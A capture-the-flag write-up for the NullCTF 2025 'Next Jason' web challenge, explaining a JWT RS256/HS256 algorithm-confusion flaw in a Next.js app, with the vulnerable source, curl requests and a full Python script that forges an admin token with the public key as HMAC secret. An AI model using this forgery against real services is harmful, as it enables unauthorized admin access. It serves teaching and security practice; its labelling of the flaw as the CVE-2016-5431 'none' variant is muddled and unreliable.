# NullCTF 2025 - Next Jason Challenge Writeup

**Author:** Stefan  
**Difficulty:** Easy  
**Category:** Web Security  

## Challenge Description

> At least JSON has only one pronunciation, unlike GIF. JWT too, I guess?

The challenge provides a remote server URL and presents a Next.js web application that implements JWT (JSON Web Token) authentication. The goal is to exploit a vulnerability in the JWT implementation to gain admin access and retrieve the flag.

## Intro

This challenge demonstrates a classic **JWT Algorithm Confusion** vulnerability (also known as CVE-2016-5431 or the "none" algorithm attack variant). The application uses the `jsonwebtoken` library to sign tokens with RS256 (RSA asymmetric cryptography) but incorrectly allows both RS256 and HS256 (HMAC symmetric cryptography) algorithms during verification. This allows an attacker to forge a valid admin token by signing it with HS256 using the public key as the HMAC secret.

### Technology Stack

- **Framework:** Next.js 14.2.24
- **Runtime:** Node.js
- **JWT Library:** jsonwebtoken 8.5.1
- **Authentication:** Cookie-based JWT tokens
- **Cryptography:** RS256 for signing, but vulnerable to HS256 confusion

## Initial Analysis

### Application Structure

The application consists of several key endpoints:

```
app/
├── api/
│   ├── getFlag/route.js          # Returns flag if authenticated as admin
│   ├── getPublicKey/route.js     # Exposes the RSA public key
│   └── login/route.js             # Handles user login
├── token/
│   ├── sign/route.js              # Signs JWT tokens with RS256
│   └── verify/route.js            # Verifies JWT tokens (vulnerable)
├── middleware.js                  # Authentication middleware
└── page.js                        # Login frontend
```

### Analyzing the Source Code

#### 1. Token Signing Endpoint (`app/token/sign/route.js`)

```javascript
import { NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';
import { readFileSync } from 'fs';
import path from 'path';
const PRIVKEY = readFileSync(path.join(process.cwd(), 'private.pem'), 'utf8');

function signToken(payload) {
	return jwt.sign(payload, PRIVKEY, { algorithm: 'RS256' });
}

export async function POST(request) {
	try {
		const body = await request.json();

		if (!body || Object.keys(body).length === 0) {
			return NextResponse.json({ error: 'Payload required' }, { status: 400 });
		} else if (body.username === 'admin') {
			return NextResponse.json({ error: 'Try harder' }, { status: 403 });
		}

		const token = signToken(body);
		return NextResponse.json({ token });
	} catch (error) {
		console.error('Token signing error:', error);
		return NextResponse.json({ token: 'error', error: 'Failed to sign token' }, { status: 500 });
	}
}
```

**Key Observations:**
- Tokens are signed with **RS256** using a private key
- Direct signing as `admin` is blocked
- Anyone can request a token for any non-admin username
- The endpoint is **not** under `/api/*`, so it bypasses the middleware

#### 2. Token Verification Endpoint (`app/token/verify/route.js`)

```javascript
import { NextResponse } from 'next/server';
import jwt from 'jsonwebtoken';
import { readFileSync } from 'fs';
import path from 'path';
const PUBKEY = readFileSync(path.join(process.cwd(), 'public.pem'), 'utf8');

function verifyToken(token) {
	return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });
}

export async function POST(request) {
	try {
		const { token } = await request.json();

		if (!token) {
			return NextResponse.json({ error: 'Token required' }, { status: 400 });
		}

		const payload = verifyToken(token);
		return NextResponse.json({ valid: true, payload });
	} catch (error) {
		console.error('Token verification error:', error);
		return NextResponse.json({ valid: false, error: 'Invalid token' }, { status: 400 });
	}
}
```

**Critical Vulnerability:**
- The verification function accepts **both RS256 and HS256** algorithms: `{ algorithms: ['RS256', 'HS256'] }`
- When HS256 is used, the `PUBKEY` parameter is treated as an HMAC secret
- This allows algorithm confusion attacks

#### 3. Flag Endpoint (`app/api/getFlag/route.js`)

```javascript
import { NextResponse } from 'next/server';

export async function GET(req) {
	try {
		const token = req.cookies.get('token')?.value;
		const valid = await fetch(new URL('/token/verify', req.url), {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
			},
			body: JSON.stringify({ token }),
		});
		const payload = await valid.json();
		if (!payload.valid) return NextResponse.json({ error: 'Invalid token or token missing' }, { status: 403 });
		if (payload.payload.username !== 'admin') return NextResponse.json({ error: 'You need to be admin!' }, { status: 403 });

		const flag = process.env.FLAG;

		return NextResponse.json({ flag });
	} catch (error) {
		console.error('Error retrieving public key:', error);
		return NextResponse.json({ error: 'Failed to retrieve public key' }, { status: 500 });
	}
}
```

**Requirements:**
- Valid JWT token in cookies
- Token payload must contain `username: "admin"`

#### 4. Public Key Endpoint (`app/api/getPublicKey/route.js`)

```javascript
import { NextResponse } from 'next/server';
import { readFileSync } from 'fs';
import path from 'path';

const PUBKEY = readFileSync(path.join(process.cwd(), 'public.pem'), 'utf8');

export async function GET(req) {
	try {
		return NextResponse.json({ PUBKEY });
	} catch (error) {
		console.error('Error retrieving public key:', error);
		return NextResponse.json({ error: 'Failed to retrieve public key' }, { status: 500 });
	}
}
```

**Key Observation:**
- The RSA public key is exposed via this endpoint
- This is necessary for the attack since we need the public key content

#### 5. Middleware (`middleware.js`)

```javascript
import { NextResponse } from 'next/server';

export async function middleware(req) {
	const url = req.nextUrl;

	const inviteCode = url.searchParams.get('inviteCode');
	const validInviteCode = process.env.INVITE_CODE || 'secret_invite_code';

	if (inviteCode && inviteCode === validInviteCode) {
		return NextResponse.next();
	}

	if (url.pathname === '/api/login') return NextResponse.json({ error: 'Invalid invite code' }, { status: 401 });

	const token = req.cookies.get('token')?.value;
	let isValidToken = false;

	if (token) {
		try {
			const baseUrl = `${url.protocol}//${url.host}`;
			const verifyResponse = await fetch(`${baseUrl}/token/verify`, {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json',
				},
				body: JSON.stringify({ token }),
			});

			if (verifyResponse.ok) {
				const result = await verifyResponse.json();
				if (result.valid) isValidToken = true;
			}
		} catch (error) {
			console.error('Token verification error:', error);
		}
	}

	if (isValidToken) {
		return NextResponse.next();
	}

	return NextResponse.json({ error: 'Access Denied: Valid invitation code or authentication required' }, { status: 401 });
}

export const config = {
	matcher: '/api/:path*',
};
```

**Key Observations:**
- Protects all `/api/*` endpoints
- Requires either a valid invite code or a valid JWT token
- **Crucially:** `/token/sign` is not under `/api/*`, so it's publicly accessible

## Vulnerability Analysis

### JWT Algorithm Confusion Attack

The vulnerability exists in the token verification logic:

```javascript
jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });
```

#### How RS256 Works (Normal Operation)
1. Server signs tokens using a **private key** with RS256
2. Server verifies tokens using the corresponding **public key**
3. Attackers cannot forge tokens without the private key

#### How the Attack Works (HS256 Confusion)
1. Attacker obtains the **public key** (available at `/api/getPublicKey`)
2. Attacker creates a JWT with `alg: HS256` in the header
3. Attacker signs the token using the **public key string as the HMAC secret**
4. Server receives the token and sees `alg: HS256`
5. Server uses `jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] })`
6. Since HS256 is allowed and the public key matches the HMAC secret, verification succeeds
7. Server believes the token is valid and grants access

### Why This Works

The `jsonwebtoken` library's behavior:
- When `alg: RS256` is specified, the second parameter is treated as a **public key**
- When `alg: HS256` is specified, the second parameter is treated as an **HMAC secret**
- By allowing both algorithms in verification, the server becomes vulnerable to this confusion

## Exploitation

### Step 1: Bypass Middleware Protection

Since `/api/getPublicKey` is protected by middleware, we first need a valid token to access it.

Request a valid token for a non-admin user from the unprotected `/token/sign` endpoint:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"username": "user"}' \
  http://0448c08c3556.challs.ctf.r0devnull.team:8001/token/sign
```

**Response:**
```json
{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpYXQiOjE3NjQ5NDk0NjV9.FH_SVlk-pqLXjZRuX-I06AgSnPzjTlA_i8UI2ZuUUPMeZ5ArkoPFy69pCj5BpjjGrd2oEmhUTY-zDhRfMLDX8mZCaGW2Fflm87HvrYDiFRRx-ki-sw1y67aUTZ3jye91HdR6F7dIMN9Z9jfJsJCbZG19XNBhjblPSHDwrg4FfFOowMnf5xUmP0Hxk4GhFc5JWwM2-cCaXM0GOmCTFUzefKhTr3xz4Xb81juVfx-EKFKspP1Fvi373zdpZTluleaJau3oK7rFzBYMGn6-zYpr0Onq"
}
```

This token is legitimately signed with RS256 and contains `username: "user"`.

### Step 2: Retrieve the Public Key

Using the valid token from Step 1, access the protected `/api/getPublicKey` endpoint:

```bash
curl -H "Cookie: token=<valid_token>" \
  http://0448c08c3556.challs.ctf.r0devnull.team:8001/api/getPublicKey
```

**Response:**
```json
{
  "PUBKEY": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...\n-----END PUBLIC KEY-----\n"
}
```

Now we have the RSA public key that we'll use as the HMAC secret.

### Step 3: Forge an Admin Token

Create a JWT with:
- **Algorithm:** HS256 (not RS256)
- **Payload:** `{"username": "admin"}`
- **Secret:** The public key string from Step 2

#### Manual JWT Construction

A JWT consists of three parts: `header.payload.signature`

**Header:**
```json
{"alg": "HS256", "typ": "JWT"}
```

**Payload:**
```json
{"username": "admin"}
```

**Signing Process:**
1. Base64URL encode the header and payload
2. Concatenate with a dot: `base64url(header).base64url(payload)`
3. Sign with HMAC-SHA256 using the public key as the secret
4. Base64URL encode the signature
5. Concatenate all three parts: `header.payload.signature`

### Step 4: Retrieve the Flag

Send the forged token to `/api/getFlag`:

```bash
curl -H "Cookie: token=<forged_admin_token>" \
  http://0448c08c3556.challs.ctf.r0devnull.team:8001/api/getFlag
```

**Response:**
```json
{
  "flag": "nullctf{f0rg3_7h15_cv3_h3h_d86eb808dc22ce50}"
}
```

## Exploit Script

Here's the complete Python exploit script that automates the entire attack:

```python
import requests
import jwt
import json
import hmac
import hashlib
import base64

BASE_URL = "http://0448c08c3556.challs.ctf.r0devnull.team:8001"

def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=')

def get_valid_token():
    print("[*] Getting valid token for 'user'...")
    r = requests.post(f"{BASE_URL}/token/sign", json={"username": "user"})
    if r.status_code != 200:
        print(f"[-] Failed to get token: {r.text}")
        exit(1)
    token = r.json()["token"]
    print(f"[+] Got token: {token[:20]}...")
    return token

def get_public_key(token):
    print("[*] Getting public key...")
    cookies = {"token": token}
    r = requests.get(f"{BASE_URL}/api/getPublicKey", cookies=cookies)
    if r.status_code != 200:
        print(f"[-] Failed to get public key: {r.text}")
        exit(1)
    pubkey = r.json()["PUBKEY"]
    print("[+] Got public key")
    return pubkey

def forge_token(pubkey):
    print("[*] Forging admin token using HS256 and public key as secret...")
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"username": "admin"}
    
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    msg = header_b64 + b'.' + payload_b64
    
    secret = pubkey.encode('utf-8')
    
    signature = hmac.new(secret, msg, hashlib.sha256).digest()
    signature_b64 = base64url_encode(signature)
    
    return (msg + b'.' + signature_b64).decode('utf-8')

def get_flag(token):
    print("[*] Attempting to get flag...")
    cookies = {"token": token}
    r = requests.get(f"{BASE_URL}/api/getFlag", cookies=cookies)
    if r.status_code != 200:
        print(f"[-] Failed to get flag: {r.text}")
        return
    print(f"[+] Response: {r.text}")

def main():
    valid_token = get_valid_token()
    pubkey = get_public_key(valid_token)
    forged_token = forge_token(pubkey)
    get_flag(forged_token)

if __name__ == "__main__":
    main()
```

### Running the Exploit

```bash
$ python exploit.py
[*] Getting valid token for 'user'...
[+] Got token: eyJhbGciOiJSUzI1NiIs...
[*] Getting public key...
[+] Got public key
[*] Forging admin token using HS256 and public key as secret...
[*] Attempting to get flag...
[+] Response: {"flag":"nullctf{f0rg3_7h15_cv3_h3h_d86eb808dc22ce50}"}
```

## Key Takeaways

1. **Algorithm Confusion is Critical:** Never allow multiple algorithms in JWT verification unless absolutely necessary and properly validated
2. **Defense in Depth:** Multiple layers of security (proper algorithm validation, middleware, access controls) are essential
3. **Public Keys are Public:** While exposing public keys isn't inherently insecure, it facilitates certain attacks when combined with other vulnerabilities
4. **Library Configuration Matters:** Understanding how cryptographic libraries handle different algorithm types is crucial for secure implementation
5. **Testing is Essential:** Security testing should include attempts to manipulate JWT headers and algorithms

Pwned!

KOREONE
